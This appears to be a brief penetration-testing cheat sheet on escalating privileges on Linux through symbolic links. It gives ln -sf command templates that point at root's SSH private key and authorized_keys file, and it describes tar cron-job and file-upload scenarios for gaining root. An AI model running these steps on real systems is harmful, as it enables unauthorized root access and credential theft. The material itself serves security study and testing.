# PrivEsc via Link Symbolics

## Practice

Sometimes, as another user we can edit a file. However, if we have permissions to modify that file, we could add a symbolic link to point to another file where that user has permissions to read and/or edit it. Example:

```bash
ln -sf <PATH TO READ/MODIFY FILE> <FILE>
ln -sf <PATH TO DIRECTORY> <DIRECTORY>
# Examples:
ln -sf /root/.ssh/id_rsa <FILE>
ln -sf /root/.ssh/authorized_keys authorized_keys
ln -sf /root/ <DIRECTORY>
```

### Possible scenarios

* If there is a scheduled task that uses the `tar` command, we can make a symbolic link to a file/directory and when it is compressed as another user (as root), when decompressing it we will see the linked content. This is only useful if symbolic links are allowed with the tar command.
* If we can upload files as root but not overwrite them, we can create a symbolic link to a file that does not exist but allows us to write content to log in as root (for example: `/root/.ssh/authorized_keys`).

